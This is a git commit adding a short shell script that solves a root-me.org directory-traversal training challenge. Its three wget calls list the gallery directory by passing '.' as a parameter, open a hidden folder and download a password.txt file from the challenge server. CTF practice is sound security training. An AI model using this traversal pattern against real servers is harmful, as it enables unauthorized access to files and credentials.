3e9eddc3ffb7764348f0550449c19b8013137786
anomen <ludek.h@gmail.com>
2015-07-08 22:29:36 +0200

    root-me.org/Web-Server/Directory-traversal

---
+++ root-me.org/Web-Server/Directory-traversal/run.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+
+wget 'http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.'
+
+
+wget 'http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r'
+
+
+wget 'http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt'
+
+
